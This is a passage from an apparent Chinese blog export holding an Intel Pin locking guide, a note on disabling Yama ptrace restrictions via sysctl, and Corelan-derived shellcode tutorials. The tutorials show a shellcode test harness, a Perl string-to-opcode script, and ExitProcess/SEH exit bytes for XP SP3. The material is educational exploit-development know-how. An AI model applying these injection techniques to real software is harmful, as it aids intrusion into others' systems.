line的不同部分,至少其中之一是写。为了保持内存一致性，计算机必须将一个CPU的缓存拷贝到另一个，即使其他数据没有共享。可以通过将关键数据对其到cache line上或者重新排列数据结构避免False共享。</p>\n<h1 id=\"Avoiding-Deadlocks-in-Multi-threaded-Applications\"><a href=\"#Avoiding-Deadlocks-in-Multi-threaded-Applications\" class=\"headerlink\" title=\"Avoiding Deadlocks in Multi-threaded Applications\"></a>Avoiding Deadlocks in Multi-threaded Applications</h1><p>因为Pin,the tool和程序可能都会要求或释放锁，Pin tool的开发者必须小心避免死锁。死锁经常发生在两个线程以不同的顺序要求同样的锁。例如，线程A要求lock L1，接着要求L2,线程B要求lock L2，接着要求L1。如果线程A得到了L1，等待L2，同时线程B得到了L2，等待L1，这就导致了死锁。为了避免死锁,Pin为必须获得的锁强加了一个层次结构。Pin在要求任何锁时会要求自己的内部锁。我们假设应用将会在这个层次结构的顶端获得锁。下面的图展示了这种结构：<br><figure class=\"highlight xl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">A<span class=\"function\"><span class=\"title\">pplication</span> locks -&gt;</span> P<span class=\"function\"><span class=\"title\">in</span> internal locks -&gt;</span> Tool locks</div></pre></td></tr></table></figure></p>\n<p>Pin tool开发者在设计他们自己的锁时不应该破坏这个锁层次结构。下面是基本的指导原则：</p>\n<ul>\n<li>如果tool在一个Pin回调中要求任何锁，它在从这个回调中返回时必须释放这些锁。从Pin内部锁看来，在Pin回调中占有一个锁违背了这个层次结构。</li>\n<li>如果tool在一个分析函数中请求任何锁，它从这个分析函数中返回时必须释放这些锁。从Pin内部锁和程序自身看来，在分析函数中占有一个锁违背了这个层次结构。</li>\n<li>如果tool在一个Pin回调或者分析函数中调用Pin API，它不应该在调用API的时候占有任何锁。一些Pin API使用了内部Pin锁，所以在调用这些API时占有一个tool锁违背了这个层次结构。</li>\n<li>如果tool在分析函数里面调用了Pin API，它可能需要在要求Pin客户锁时调用PIN_LockClient()。这取决于API，需要查看特定API的更多信息。注意tool在调用PIN_Lockclient（）时，不能占有任何上述所述其他锁。</li>\n</ul>\n<p>虽然上述的指导在大多数情况下已经足够，但是它们活血在某些特定的情形下显得比较严格。下面的指导解释了上述基本指导的放松情形：</p>\n<ul>\n<li>在JIT模式下，tool可能在分析函数中要求锁而不释放它们，直到将要离开包含这个分析函数的trace。tool必须期望trace在程序还没有抛出异常的时尽早退出。任何被tool占有的锁L在程序抛出异常时，必须遵守以下规则：<ul>\n<li>tool必须建立一个当程序抛出异常时的处理回调，这个回调会释放之前得到的锁L。可以使用PIN_AddContextChangeFunction()建立这个回调。</li>\n<li>为了避免破坏这个层次结构，tool禁止在Pin回调中要求锁。</li>\n</ul>\n</li>\n<li>如果tool从一个分析函数中调用Pin API，如果在调用API时繁盛了下面情况，它可能会要求并占有一个锁L：<ul>\n<li>锁L不是从任何Pin回调中请求的。这避免了违背这个层次结构。</li>\n<li>被调用的Pin API不会导致程序代码被执行。这避免了违背这个层次结构。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/01/02/intro-to-pin/\" target=\"_blank\" rel=\"external\">Intel Pin简介</a><br><a href=\"https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/\" target=\"_blank\" rel=\"external\">Pin 2.13 User Guide</a></p>\n"},{"title":"Linux Pin使用之设置Yama安全模块","url":"http://huirong.github.io/2015/12/30/Using-Intel-Pin-tools-for-binary-instrumentation/","content":"<p>最近论文开始做试验了，需要用到二进制插装，学习过程与大家分享。<br><a id=\"more\"></a></p>\n<h1 id=\"Yama-安全模块\"><a href=\"#Yama-安全模块\" class=\"headerlink\" title=\"Yama 安全模块\"></a>Yama 安全模块</h1><p>本文将介绍基本Intel Pin工具代码编写，但是在此之前，要注意的是Linux默认的 Security Module会禁止二进制插装。<br> Yama is a Linux Security Module that collects a number of system-wide DAC security protections that are not handled by the core kernel itself.</p>\n<p> Yama使用sysctl进行控制，/proc/sys/kernel/yama/ptrace_scope 可能的值及其相应解释如下：<br> <figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"symbol\">0 </span>=&gt; Classic ptrace: a process can PTRACE_ATTACH <span class=\"keyword\">to</span> any other process running under the same uid, as long as it is dumpable.</div><div class=\"line\"><span class=\"symbol\">1 </span>=&gt; Restricted ptrace: a process can only PTRACE_ATTACH only its descendants although an inferior can <span class=\"keyword\">call</span> prctl(PR_SET_PTRACER, debugger, …) <span class=\"keyword\">to</span> allow the debugger <span class=\"keyword\">to</span> <span class=\"keyword\">call</span> PTRACE_ATTACH.</div><div class=\"line\"><span class=\"symbol\">2 </span>=&gt; Admin-only attach: only processes with CAP_SYS_PTRACE may use ptrace with PTRACE_ATTACH</div><div class=\"line\"><span class=\"symbol\">3 </span>=&gt; No attach: no processes may use ptrace with PTRACE_ATTACH nor via PTRACE_TRACEME.</div></pre></td></tr></table></figure></p>\n<p>想了解更多详细信息，请阅读<a href=\"https://www.kernel.org/doc/Documentation/security/Yama.txt\" target=\"_blank\" rel=\"external\">关于Yama的Linux内核文档</a>。</p>\n<p>回到Pin，如果 /proc/sys/kernel/yama/ptrace_scope 的值设置为1sysctl kernel.yama.ptrace_scope=0，会有如下信息：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ezhya70r2tj30zm04j3zc.jpg\" alt=\"\"></p>\n<p>为了允许调试程序，需要使用 sysctl 设置 /proc/sys/kernel/yama/ptrace_scope 的值<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sysctl kernel<span class=\"selector-class\">.yama</span><span class=\"selector-class\">.ptrace_scope</span>=<span class=\"number\">0</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ezhyeydkzej30zo07n76x.jpg\" alt=\"\"></p>\n<p>OK！！！！可以成功运行Pin工具了。。。。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://labs.portcullis.co.uk/blog/using-intel-pin-tools-for-binary-instrumentation/\" target=\"_blank\" rel=\"external\">Using Intel Pin tools for binary instrumentation</a></p>\n"},{"title":"shellcode 编写笔记2：退出shellcode","url":"http://huirong.github.io/2015/12/20/shellcodeWriting2-exit/","content":"<p>在 C 程序中，调用完MessageBox API 后，将会用2 个指令退出进程：LEAVE 和RET。在独立的应用程序中shellcode 能工作良好，但是我们的shellcode 要注入到另一个应用程序中。因此在调用MessageBox 后调用leave/ret 很有可能破坏原来的程序，使程序崩溃。<br><a id=\"more\"></a></p>\n<h1 id=\"退出shellcode方法\"><a href=\"#退出shellcode方法\" class=\"headerlink\" title=\"退出shellcode方法\"></a>退出shellcode方法</h1><p>有两种方法来退出shellcode：尽可能悄无声息的结束一切，但是我们也可以试着保持父进程继续运行…可能下次还能再次被exploit。<br>在此将会讨论第三种能够用来退出shellcode 的方法：</p>\n<ul>\n<li>process:用ExitProcess()</li>\n<li>SEH：强制产生一个异常调用。记住这种方法可能会使exploit 代码不停的运行。（如果那个原始的bug 是专门为这个例子设的SEH）</li>\n<li>thread：用ExitThread()</li>\n</ul>\n<p>明显的，上面的方法没有一个能确保父进程不会崩溃或者当它被exploit 时会继续保持可利用性。我只是讨论三种技术（顺便提一下，这些在Metasploit 上都是有的）：））</p>\n<h1 id=\"ExitProcess\"><a href=\"#ExitProcess\" class=\"headerlink\" title=\"ExitProcess()\"></a>ExitProcess()</h1><p>这个技术是基于一个windows API“ExitProcess”，可以在kernel32.dll 中找到。只有一个参数：ExitProcess 的退出码。它的值在调用这个API 前（0 意味着一切OK）必须入栈。</p>\n<p>在XP SP3 上，ExitProcess（）这个API 能在0x7c81cafa 地址处找到:</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1ez681dbpktj30ct07yq4q.jpg\" alt=\"\"></p>\n<p>因此为了使shellcode 正常退出，我们必须把下面的指令加到shellcode 的底部，在MessageBox 函数被调用之后正常退出<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">xor eax, eax ; zero out eax (NULL)</div><div class=\"line\">push eax ; put zero to stack (exitcode parameter)</div><div class=\"line\">mov eax, <span class=\"number\">0</span>x7c81cafa ; ExitProcess(exitcode)</div><div class=\"line\">call eax ; <span class=\"keyword\">exit</span> cleanly</div></pre></td></tr></table></figure></p>\n<p>或者用字节/机器码（使用mona插件转化，mona插件的使用，我之前的<a href=\"http://huirong.github.io/2015/12/18/mona/\">博客</a>有介绍）：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">\"\\x33\\xc0\"</span> //<span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">eax</span> =&gt; <span class=\"built_in\">eax</span> is now <span class=\"number\">00000000</span></div><div class=\"line\"><span class=\"string\">\"\\x50\"</span> //<span class=\"keyword\">push</span> <span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"string\">\"\\xc7\\xc0\\xfa\\xca\\x81\\x7c\"</span> // <span class=\"keyword\">mov</span> <span class=\"built_in\">eax</span>,<span class=\"number\">0x7c81cafa</span></div><div class=\"line\"><span class=\"string\">\"\\xff\\xe0\"</span> //<span class=\"keyword\">jmp</span> <span class=\"built_in\">eax</span> = launch ExitProcess(<span class=\"number\">0</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"SEH\"><a href=\"#SEH\" class=\"headerlink\" title=\"SEH\"></a>SEH</h1><p>退出shellcode 的第二种方法（同时使父进程继续运行）是触发一个异常（比如call 0x00）–就像这样：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">eax</span></div><div class=\"line\"><span class=\"keyword\">call</span> <span class=\"built_in\">eax</span></div></pre></td></tr></table></figure></p>\n<p>因为这个代码明显比其他的短，它可能导致不可预期的结果。如果一个异常处理函数已经设置好，就可以在你的exploit 中利用异常处理函数（基于SEH 的exploit），然后这个shellcode就会循环。这在特定的情况下会OK（比如说，举个例子，你试着使机器可利用而不是只exploit一次）。</p>\n<h1 id=\"ExitThread\"><a href=\"#ExitThread\" class=\"headerlink\" title=\"ExitThread()\"></a>ExitThread()</h1><p>这个函数需要一个参数：退出码（跟ExitProcess())函数很像）。</p>\n"},{"title":"shellcode编写笔记1","url":"http://huirong.github.io/2015/12/20/shellcodeWriting1/","content":"<p>这篇文章将只是涉及已经有的思想，引导你理解如何写并用通用的shellcode。没有包括<br>一些新的技术和新类型的shellcode。<br><a id=\"more\"></a></p>\n<h1 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h1><ul>\n<li>C/C++编译器：dev c++</li>\n<li>调试器：Immunity Debugger</li>\n<li>Windows SP3（预装Perl环境）</li>\n<li>测试程序如下<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">char code[] = <span class=\"string\">\"paste your shellcode here\"</span><span class=\"comment\">;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">int</span> main(<span class=\"built_in\">int</span> argc, char **argv)&#123;\t</div><div class=\"line\">\t<span class=\"built_in\">int</span>(*<span class=\"function\"><span class=\"keyword\">func</span>)<span class=\"params\">()</span>;</span></div><div class=\"line\">\t<span class=\"function\"><span class=\"keyword\">func</span> = <span class=\"params\">(int (*)</span><span class=\"params\">()</span>) <span class=\"title\">code</span>;</span></div><div class=\"line\">\t(<span class=\"built_in\">int</span>)(*<span class=\"function\"><span class=\"keyword\">func</span>)<span class=\"params\">()</span>;</span></div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><font color=\"red\">注意：</font>我是在XP SP3 平台下写这个教程的，所以如果你用不同版本的操作系统时一些地址会不同。</p>\n<h1 id=\"从-C-到shellcode\"><a href=\"#从-C-到shellcode\" class=\"headerlink\" title=\"从 C 到shellcode\"></a>从 C 到shellcode</h1><p>如果我们想写个显示一个MessageBox 的shellcode，MessageBox 上的文本是“You have been pwned by star”。这个exploit在实际生活中不怎么又用，但在你想写或者修改出更复杂的shellcode之前，这会教你一些基本技术。</p>\n<p>我使用的是dev c++编译器，如果读者用的其他编译器，其中一些细节可能不一样，但概念和最后结果应该差不多。</p>\n<h3 id=\"1、源代码-a-cpp-：\"><a href=\"#1、源代码-a-cpp-：\" class=\"headerlink\" title=\"1、源代码(a.cpp)：\"></a>1、源代码(a.cpp)：</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span>&#123;</div><div class=\"line\">\tLoadLibrary(<span class=\"string\">\"user32.dll\"</span>);</div><div class=\"line\">\t</div><div class=\"line\">\tMessageBox(<span class=\"literal\">NULL</span>,</div><div class=\"line\">\t\t<span class=\"string\">\"You have been pwned by star\"</span>,</div><div class=\"line\">\t\t<span class=\"string\">\"star\"</span>,</div><div class=\"line\">\t\tMB_OK);</div><div class=\"line\">\t\t</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"2、编译运行这个程序\"><a href=\"#2、编译运行这个程序\" class=\"headerlink\" title=\"2、编译运行这个程序\"></a>2、编译运行这个程序</h3><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez44ngew29j305a02uglm.jpg\" alt=\"\"></p>\n<p><font color=\"red\">Tips：</font>MessageBox 函数在user32.dll中，Dev C++需要手动加载此库</p>\n<h3 id=\"3、查看可执行文件\"><a href=\"#3、查看可执行文件\" class=\"headerlink\" title=\"3、查看可执行文件\"></a>3、查看可执行文件</h3><p>使用 Immunity Debugger 打开刚生成的可执行文件a.exe，main函数如下：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez44sumlukj30kh08s41o.jpg\" alt=\"\"></p>\n<h3 id=\"4、分析\"><a href=\"#4、分析\" class=\"headerlink\" title=\"4、分析\"></a>4、分析</h3><ul>\n<li>push ebp 和mov ebp，esp 指令是用来设置堆栈的一部分指令。我们在自己的shellcode里不需要他们，因为我们会在一个已经运行的程序里运行我们的shellcode，我们假设堆栈已经被正确的设置好了。（这可能是不对的，在实际生活中，你需要调节寄存器/堆栈来使你的shellcode 工作，但这个暂时超出讨论的范围）。</li>\n<li>我们把会用到的参数放到栈顶，按反序入栈。标题（a.0040400B）和MessageBox 文本（a.00404010）是从可执行文件的.data 节中取出的；按钮的样式（MB_OK）和句柄hOwner 都是0。</li>\n<li>我们调用MessageBoxA 这个windows API（包含在user32.dll 中），这个API 有四个参数。</li>\n</ul>\n<p>实际上，我们离把这个转化成可用的shellcode 不远。如果我们从上面的输出得到机器码字节，我们有了自己的基本shellcode。我们只需要改变几处地方就能使它工作：</p>\n<ol>\n<li>改变字符串（“Corelan”作为标题，“You have been pwned by Corelan”作为文本）放在栈中的方式。在我们的例子里，这些字符串是从C 程序的.data 节中取出来的。但是当我们exploit 另一个程序时，我们不能用特定程序的.data 节（因为它会包含一些其他的东西）。因此我们需要自己把字符串放到栈中，然后把指向字符串的指针传递给MessageBoxA 函数。</li>\n<li>找到MessageBoxA 的地址然后直接调用。Immunity Debugger打开a.exe，右键 search for -&gt; Name in all Modules</li>\n</ol>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez454c096oj30i60dtae7.jpg\" alt=\"\"></p>\n<p>查找MessageBox的地址</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez455hw52xj30ch02haai.jpg\" alt=\"\"></p>\n<p>MessageBox的地址为：0x77D507EA</p>\n<p><font color=\"red\">Tips：</font>这个地址将会和其他版本的操作系统上的地址不一样</p>\n<h1 id=\"把asm转化为-shellcode：将字符串入栈并且返回指向字符串的指针\"><a href=\"#把asm转化为-shellcode：将字符串入栈并且返回指向字符串的指针\" class=\"headerlink\" title=\"把asm转化为 shellcode：将字符串入栈并且返回指向字符串的指针\"></a>把asm转化为 shellcode：将字符串入栈并且返回指向字符串的指针</h1><ul>\n<li>把字符串转化为十六进制值</li>\n<li>把十六进制值入栈（按反序）。不要忘了字符串末尾的null 字节，确保一切都是4 字节对齐（需要时加上一些空格）</li>\n</ul>\n<p>接下来的小脚本将会产生把字符串入栈的机器码（a.pl)：<br><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/perl</span></div><div class=\"line\"><span class=\"comment\"># Perl script written by Peter Van Eeckhoutte</span></div><div class=\"line\"><span class=\"comment\"># http://www.corelan.be:8800</span></div><div class=\"line\"><span class=\"comment\"># This script takes a string as argument</span></div><div class=\"line\"><span class=\"comment\"># and will produce the opcodes</span></div><div class=\"line\"><span class=\"comment\"># to push this string onto the stack</span></div><div class=\"line\"><span class=\"keyword\">if</span> ($#ARGV <span class=\"keyword\">ne</span> <span class=\"number\">0</span>) &#123;</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\" usage: $0\"</span>.chr(<span class=\"number\">34</span>).<span class=\"string\">\"String to put on stack\"</span>.chr(<span class=\"number\">34</span>).<span class=\"string\">\"\\n\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">exit</span>(<span class=\"number\">0</span>); </div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#convert string to bytes</span></div><div class=\"line\"><span class=\"keyword\">my</span> $strToPush=$ARGV[<span class=\"number\">0</span>];</div><div class=\"line\"><span class=\"keyword\">my</span> $strThisChar=<span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $strThisHex=<span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $cnt=<span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $bytecnt=<span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $strHex=<span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $strOpcodes=<span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"keyword\">my</span> $strPush=<span class=\"string\">\"\"</span>;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"String length :\"</span> . <span class=\"keyword\">length</span>($strToPush).<span class=\"string\">\"\\n\"</span>;</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Opcodes to push this string onto the stack :\\n\\n\"</span>;</div><div class=\"line\"><span class=\"keyword\">while</span> ($cnt &lt; <span class=\"keyword\">length</span>($strToPush))</div><div class=\"line\">&#123;</div><div class=\"line\">\t$strThisChar=<span class=\"keyword\">substr</span>($strToPush,$cnt,<span class=\"number\">1</span>);</div><div class=\"line\">\t$strThisHex=<span class=\"string\">\"\\\\x\"</span>.ascii_to_hex($strThisChar);</div><div class=\"line\">\t<span class=\"keyword\">if</span> ($bytecnt &lt; <span class=\"number\">3</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t$strHex=$strHex.$strThisHex;</div><div class=\"line\">\t\t$bytecnt=$bytecnt+<span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t$strPush = $strHex.$strThisHex;</div><div class=\"line\">\t\t$strPush =~ <span class=\"regexp\">tr/\\\\x//d</span>;</div><div class=\"line\">\t\t$strHex=<span class=\"keyword\">chr</span>(<span class=\"number\">34</span>).<span class=\"string\">\"\\\\x68\"</span>.$strHex.$strThisHex.chr(<span class=\"number\">34</span>).</div><div class=\"line\">\t\t<span class=\"string\">\" //PUSH 0x\"</span>.substr($strPush,<span class=\"number\">6</span>,<span class=\"number\">2</span>).substr($strPush,<span class=\"number\">4</span>,<span class=\"number\">2</span>).</div><div class=\"line\">\t\t<span class=\"keyword\">substr</span>($strPush,<span class=\"number\">2</span>,<span class=\"number\">2</span>).substr($strPush,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</div><div class=\"line\">\t\t$strOpcodes=$strHex.<span class=\"string\">\"\\n\"</span>.$strOpcodes;</div><div class=\"line\">\t\t$strHex=<span class=\"string\">\"\"</span>;</div><div class=\"line\">\t\t$bytecnt=<span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t$cnt=$cnt+<span class=\"number\">1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#last line</span></div><div class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">length</span>($strHex) &gt; <span class=\"number\">0</span>)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"keyword\">length</span>($strHex) &lt; <span class=\"number\">12</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t$strHex=$strHex.<span class=\"string\">\"\\\\x20\"</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t$strPush = $strHex;</div><div class=\"line\">\t$strPush =~ <span class=\"regexp\">tr/\\\\x//d</span>;</div><div class=\"line\">\t$strHex=<span class=\"keyword\">chr</span>(<span class=\"number\">34</span>).<span class=\"string\">\"\\\\x68\"</span>.$strHex.<span class=\"string\">\"\\\\x00\"</span>.chr(<span class=\"number\">34</span>).<span class=\"string\">\" //PUSH 0x00\"</span>.</div><div class=\"line\">\t<span class=\"keyword\">substr</span>($strPush,<span class=\"number\">4</span>,<span class=\"number\">2</span>).substr($strPush,<span class=\"number\">2</span>,<span class=\"number\">2</span>).substr($strPush,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</div><div class=\"line\">\t$strOpcodes=$strHex.<span class=\"string\">\"\\n\"</span>.$strOpcodes;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"comment\">#add line with spaces + null byte (string terminator)</span></div><div class=\"line\">\t$strOpcodes=<span class=\"keyword\">chr</span>(<span class=\"number\">34</span>).<span class=\"string\">\"\\\\x68\\\\x20\\\\x20\\\\x20\\\\x00\"</span>.chr(<span class=\"number\">34</span>).</div><div class=\"line\">\t<span class=\"string\">\" //PUSH 0x00202020\"</span>.<span class=\"string\">\"\\n\"</span>.$strOpcodes;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> $strOpcodes;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ascii_to_hex</span> ($)</span></div><div class=\"line\">&#123;</div><div class=\"line\">\t(<span class=\"keyword\">my</span> $str = <span class=\"keyword\">shift</span>) =~ <span class=\"regexp\">s/(.|\\n)/sprintf(\"%02lx\", ord $1)/eg</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> $str;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>例子：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez45cz5ovdj30i80c3gnz.jpg\" alt=\"\"></p>\n<p>只把文本入栈是不够的。MessageBoxA 函数（就像其他的windows API 函数）希望得到指向文本的指针，而不是文本自身。因此我们必须把这个考虑进去。其他的两个参数（hWnd和ButtonType）不要是指针，只要设为0 就行了。因此我们需要对这两个参数用不同的方法。<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">int</span> MessageBox(</div><div class=\"line\">\t<span class=\"built_in\">HWND</span> <span class=\"built_in\">hWnd</span>,</div><div class=\"line\">\tLPCTSTR lpText,</div><div class=\"line\">\tLPCTSTR lpCaption,</div><div class=\"line\">\tUINT uType</div><div class=\"line\">)<span class=\"comment\">;</span></div></pre></td></tr></table></figure></p>\n<p>=&gt;hWnd 和uType 的值从堆栈中取出，lpText 和lpCaption 是指向字符串的指针。</p>\n<h1 id=\"从asm到-shellcode：把-MessageBox的参数入栈\"><a href=\"#从asm到-shellcode：把-MessageBox的参数入栈\" class=\"headerlink\" title=\"从asm到 shellcode：把 MessageBox的参数入栈\"></a>从asm到 shellcode：把 MessageBox的参数入栈</h1><p>这就是我们要做的：</p>\n<ul>\n<li>将字符串入栈然后把指向文本字符串的指针保存在寄存器中。因此在把字符串入栈后，必须把当前的堆栈位置保存在一个寄存器中。我们将用ebx 来存指向标题文本的指针，ecx来保存messagebox 的文本字符串的指针。当前栈顶位置=ESP。所以一个简单的movebx,esp 或者mov ecx,esp 就行了。</li>\n<li>将其中的一个寄存器置为0，所以我们在需要时将它入栈（用作hWnd 和Button 的参数）。把一个寄存器置为0 可以简单的采取对自身XOR（xor eax,eax）。把0 和指针按正确的顺序，正确的位置入栈（指向字符串的指针）<br>调用MessageBox 函数（将会从堆栈的前四个地址并且把寄存器的内容作为MessageBox函数的参数）</li>\n</ul>\n<p>除了这个之外，当我们在user32.dll 中看MessageBox 函数时，我们可以看到：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez45h270fnj30k408w77f.jpg\" alt=\"\"></p>\n<p>明显参数是从一个位置指向EBP 的偏移处（从EBP+8 到EBP+14）。然后EBP 是从堆栈中弹出的ESP 的值0x77D507EA。因此意味着我们必须确认我们的四个参数被精确定位。这意味着，基于我们将字符串入栈的方式，我们要在跳转到MessageBox 这个函数之前再将4 个字节入栈。（只要在调试器里调试一下，你就会知道要做什么）。</p>\n<h1 id=\"从asm到-shellcode：将东西组装在一起\"><a href=\"#从asm到-shellcode：将东西组装在一起\" class=\"headerlink\" title=\"从asm到 shellcode：将东西组装在一起\"></a>从asm到 shellcode：将东西组装在一起</h1><p>OK，生成最终的 code 数组,并粘贴到“shellcodetest.c”程序中，编译。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div 